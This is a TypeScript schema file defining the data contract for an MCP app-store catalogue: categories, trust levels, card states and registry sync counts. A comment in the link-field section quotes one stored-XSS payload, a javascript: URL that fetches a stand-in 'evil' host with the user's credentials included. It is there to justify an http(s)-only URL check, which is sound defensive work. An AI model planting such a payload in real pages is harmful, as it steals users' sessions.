import { z } from 'zod'

import { McpServerScopeTypeSchema } from './mcp.js'
import { NonEmptyStringSchema, TimestampSchema } from './schema-primitives.js'

/**
 * MCP App Store — the wire contract for the consumer-facing catalogue.
 *
 * Spec: `docs/plans/2026-08-29-mcp-app-store/ux-design-catalogue.md` and
 * `…/ux-design-detail-and-connect.md`.
 *
 * The store is a presentation dimension on the existing `McpCatalogEntry`, not
 * a second table, so these records are a *projection* of that row rather than a
 * mirror of it. They deliberately carry no endpoint, transport, auth config, or
 * credential reference: `/api/apps` is readable by every active member, and the
 * store's vocabulary ("app", "connected account", "capability") is the reason
 * the internal connector model must not leak through it.
 */

// ─── Link fields ────────────────────────────────────────────────────────────

/**
 * A URL a surface is allowed to render as an `href`.
 *
 * `websiteUrl` / `documentationUrl` / `repositoryUrl` reach the catalogue from
 * an untrusted upstream (the official MCP registry publishes whatever a server
 * author wrote) and land in the detail page's link list. Declared as a bare
 * `z.string()` they were stored XSS in the authenticated admin origin: a record
 * carrying `javascript:fetch('https://evil',{credentials:'include'})` becomes a
 * clickable link on `/apps/:slug`. The scheme constraint is the contract, and
 * registry ingestion refuses a non-http(s) value before it is ever persisted.
 *
 * Only the scheme is judged here. A hostile *host* is a different question,
 * answered by the SSRF guard on the endpoints Nessie actually fetches — these
 * three are shown to a person, never dialled.
 */
export const isHttpUrl = (value: string): boolean => {
  let parsed: URL
  try {
    parsed = new URL(value)
  } catch {
    return false
  }
  return parsed.protocol === 'http:' || parsed.protocol === 'https:'
}

/** The value when it is safe to render, otherwise nothing — never a throw. */
export const sanitizeHttpUrl = (value: string | null | undefined): string | null => {
  if (typeof value !== 'string') return null
  const trimmed = value.trim()
  return trimmed.length > 0 && isHttpUrl(trimmed) ? trimmed : null
}

export const HttpUrlSchema = z.string().refine(isHttpUrl, {
  message: 'Must be an http(s) URL',
})

// ─── Categories ─────────────────────────────────────────────────────────────

/**
 * One-for-one with the Prisma `McpAppCategory` enum. The database owns the
 * *set*; this array owns its order and, with the labels below, its copy.
 */
export const APP_CATEGORIES = [
  'communication',
  'development',
  'productivity',
  'crm_sales',
  'project_management',
  'customer_support',
  'data_databases',
  'analytics',
  'finance',
  'marketing',
  'files_documents',
  'ai_search',
  'infrastructure',
  'commerce',
  'other',
] as const

export const AppCategorySchema = z.enum(APP_CATEGORIES)
export type AppCategory = z.infer<typeof AppCategorySchema>

export const APP_CATEGORY_LABELS: Record<AppCategory, string> = {
  communication: 'Communication',
  development: 'Development',
  productivity: 'Productivity',
  crm_sales: 'CRM & Sales',
  project_management: 'Project Management',
  customer_support: 'Customer Support',
  data_databases: 'Data & Databases',
  analytics: 'Analytics',
  finance: 'Finance',
  marketing: 'Marketing',
  files_documents: 'Files & Documents',
  ai_search: 'AI & Search',
  infrastructure: 'Infrastructure',
  commerce: 'Commerce',
  other: 'Other',
}

/**
 * Display order for the catalogue's category sections. Fixed rather than sorted
 * by count, so a person builds spatial memory: an app does not move down the
 * page because somebody else in the organisation installed something.
 */
export const APP_CATEGORY_ORDER: readonly AppCategory[] = APP_CATEGORIES

// ─── Provenance and trust ───────────────────────────────────────────────────

/**
 * How much the instance vouches for an app. `blocked` never reaches the store —
 * it is a moderation outcome the catalogue read filters out — but the value
 * exists so an admin surface can name the state it is applying.
 */
export const AppTrustLevelSchema = z.enum([
  'nessie',
  'verified',
  'community',
  'unknown',
  'blocked',
])
export type AppTrustLevel = z.infer<typeof AppTrustLevelSchema>

export const AppDistributionSchema = z.enum(['remote', 'package', 'builtin'])
export type AppDistribution = z.infer<typeof AppDistributionSchema>

export const AppSourceSchema = z.enum(['nessie', 'mcp_registry', 'custom'])
export type AppSource = z.infer<typeof AppSourceSchema>

// ─── Card state ─────────────────────────────────────────────────────────────

/**
 * The one status a card shows, derived server-side so the grid, the detail
 * page, and any later surface agree without each re-deciding from raw rows.
 *
 * Precedence when several apply: `error` > `auth_expired` > `connecting` >
 * `multiple_accounts` > `connected` — the decision-relevant state wins, and the
 * detail view enumerates the accounts behind it. `connecting` also covers a
 * flow the client itself is holding open, which is why the client may raise a
 * card to it but never lower one out of it.
 *
 * `paused` and `disabled` are deliberately separate. `paused` means every
 * account this caller can see is switched off — something they did and can
 * undo, so the card says "Turned off" and still offers Manage. `disabled` is
 * an availability verdict an admin or moderator reached (locked, blocked,
 * deprecated): "Unavailable", with nothing for the person to act on. Folding
 * the two together left somebody who turned a connection off with no way back.
 */
export const AppCardStateSchema = z.enum([
  'available',
  'connecting',
  'connected',
  'multiple_accounts',
  'auth_expired',
  'error',
  'paused',
  'disabled',
  'unavailable',
])
export type AppCardState = z.infer<typeof AppCardStateSchema>

// ─── Catalogue card ─────────────────────────────────────────────────────────

export const AppSummaryRecordSchema = z.object({
  id: z.string().uuid(),
  /** Stable and immutable once assigned; the detail route's key. */
  slug: z.string().nullable(),
  name: NonEmptyStringSchema,
  displayName: NonEmptyStringSchema,
  shortDescription: z.string(),
  vendor: z.string().nullable(),
  // A Nessie-served path or nothing. The upstream `icon_url` never reaches a
  // client: rendering it would have every member's browser announce itself to
  // a third-party host the moment the store opens.
  iconUrl: z.string().nullable(),
  primaryCategory: AppCategorySchema,
  categories: z.array(AppCategorySchema),
  tags: z.array(z.string()),
  /**
   * Curated synonyms. On the wire because the server ranks by them (weight A)
   * and the client must be able to say *why* a result matched — an app that
   * surfaced for "pentest" highlights nowhere on its own card, and a result a
   * person cannot explain is one they stop trusting.
   */
  aliases: z.array(z.string()),
  trustLevel: AppTrustLevelSchema,
  distribution: AppDistributionSchema,
  appSource: AppSourceSchema,
  featured: z.boolean(),
  featuredOrder: z.number().int().nullable(),
  // Null until the app has been probed — absent capability counts are a card
  // that has not finished loading, not an app that can do nothing.
  toolCount: z.number().int().nonnegative().nullable(),
  resourceCount: z.number().int().nonnegative().nullable(),
  promptCount: z.number().int().nonnegative().nullable(),
  managedByIntegration: z.boolean(),
  locked: z.boolean(),
  // Instances this caller is entitled to see, never everything the tenant
  // holds, so the number on the card is the number the detail view lists.
  connectionCount: z.number().int().nonnegative(),
  state: AppCardStateSchema,
  /**
   * Where the card's primary action goes — today the existing Connectors
   * install path (`/mcp-app-store?catalogEntryId=…&action=install`), since the
   * universal connect flow is a later phase. On the summary and not only the
   * detail record because the grid's buttons need it too, and a client that
   * assembles this URL itself is a second opinion about the install route that
   * will drift the moment that route moves.
   */
  installHref: NonEmptyStringSchema,
})
export type AppSummaryRecord = z.infer<typeof AppSummaryRecordSchema>

// ─── Connected accounts ─────────────────────────────────────────────────────

export const AppConnectionStatusSchema = z.enum([
  'connecting',
  'connected',
  'expired',
  'error',
  'disabled',
])
export type AppConnectionStatus = z.infer<typeof AppConnectionStatusSchema>

export const AppConnectionSummaryRecordSchema = z.object({
  id: z.string().uuid(),
  displayName: NonEmptyStringSchema,
  scopeType: McpServerScopeTypeSchema,
  scopeId: z.string().uuid(),
  status: AppConnectionStatusSchema,
  lastConnectedAt: TimestampSchema.nullable(),
  // Plain words for the person, never an upstream transport error.
  errorMessage: z.string().nullable(),
})
export type AppConnectionSummaryRecord = z.infer<
  typeof AppConnectionSummaryRecordSchema
>

// ─── Detail page ────────────────────────────────────────────────────────────

export const AppCapabilityToolSchema = z.object({
  name: NonEmptyStringSchema,
  description: z.string(),
})
export type AppCapabilityTool = z.infer<typeof AppCapabilityToolSchema>

export const AppCapabilitiesSchema = z.object({
  tools: z.array(AppCapabilityToolSchema),
})
export type AppCapabilities = z.infer<typeof AppCapabilitiesSchema>

export const AppAgentAccessRecordSchema = z.object({
  agentId: z.string().uuid(),
  name: NonEmptyStringSchema,
  role: z.string().nullable(),
})
export type AppAgentAccessRecord = z.infer<typeof AppAgentAccessRecordSchema>

export const AppDetailRecordSchema = AppSummaryRecordSchema.extend({
  longDescription: z.string().nullable(),
  // http(s) only — see `HttpUrlSchema`. These are the fields an ingested
  // registry record fills, and the detail page renders each as an `href`.
  websiteUrl: HttpUrlSchema.nullable(),
  documentationUrl: HttpUrlSchema.nullable(),
  repositoryUrl: HttpUrlSchema.nullable(),
  // What the app can do, shown before connecting as well as after — the
  // question "is this worth connecting?" is answered by the capability list.
  capabilities: AppCapabilitiesSchema,
  connections: z.array(AppConnectionSummaryRecordSchema),
  agentsWithAccess: z.array(AppAgentAccessRecordSchema),
})
export type AppDetailRecord = z.infer<typeof AppDetailRecordSchema>

// ─── List response ──────────────────────────────────────────────────────────

export const AppCategoryCountRecordSchema = z.object({
  category: AppCategorySchema,
  label: NonEmptyStringSchema,
  // Apps visible to this caller in the category, so a filter never leads to an
  // empty grid.
  count: z.number().int().nonnegative(),
})
export type AppCategoryCountRecord = z.infer<
  typeof AppCategoryCountRecordSchema
>

export const AppListResponseSchema = z.object({
  apps: z.array(AppSummaryRecordSchema),
  // The featured strip is its own list rather than a flag the client filters:
  // it survives a search or category filter narrowing `apps` to nothing.
  featured: z.array(AppSummaryRecordSchema),
  categories: z.array(AppCategoryCountRecordSchema),
  installedCount: z.number().int().nonnegative(),
  // Total before `query`/`category` narrowing, so the empty state can say
  // whether the store is empty or only this filter is.
  totalCount: z.number().int().nonnegative(),
})
export type AppListResponse = z.infer<typeof AppListResponseSchema>

// ─── Registry sync ──────────────────────────────────────────────────────────

/**
 * One import attempt against the official MCP registry, as an owner sees it.
 *
 * The counts are the whole point: a run that completed with
 * `serversFailed > 0` is the *normal* outcome of one malformed upstream record
 * among thousands, and saying so is what keeps that from reading as a broken
 * import. `serversSkipped` is deliberately separate from failed — a
 * package-only server Nessie cannot install is not an error, it is a record
 * that does not apply. It carries no database column because it needs none:
 * every fetched record ends in exactly one of created / updated / skipped /
 * failed, so `deriveSkippedCount` reconstructs it from the four that are
 * stored and the two can never disagree.
 *
 * `completedAt: null` means the run is still going (or the process died
 * mid-run, which is the same thing from the outside until the next run starts).
 * Individual failure detail stays server-side; a member-facing surface never
 * needs an upstream parse error.
 */
export const AppRegistrySyncRunRecordSchema = z.object({
  id: z.string().uuid(),
  source: NonEmptyStringSchema,
  startedAt: TimestampSchema,
  completedAt: TimestampSchema.nullable(),
  serversFetched: z.number().int().nonnegative(),
  serversCreated: z.number().int().nonnegative(),
  serversUpdated: z.number().int().nonnegative(),
  serversSkipped: z.number().int().nonnegative(),
  serversFailed: z.number().int().nonnegative(),
  /** Words for the person, never an upstream stack trace. */
  error: z.string().nullable(),
})
export type AppRegistrySyncRunRecord = z.infer<
  typeof AppRegistrySyncRunRecordSchema
>

/**
 * Skipped is what is left over once every other outcome is accounted for.
 * Clamped at zero so a partially-written run (the process died between the
 * counter update and the completion write) reports an honest 0 rather than a
 * negative number no reader can interpret.
 */
export const deriveSkippedCount = (counts: {
  serversFetched: number
  serversCreated: number
  serversUpdated: number
  serversFailed: number
}): number =>
  Math.max(
    0,
    counts.serversFetched
      - counts.serversCreated
      - counts.serversUpdated
      - counts.serversFailed,
  )
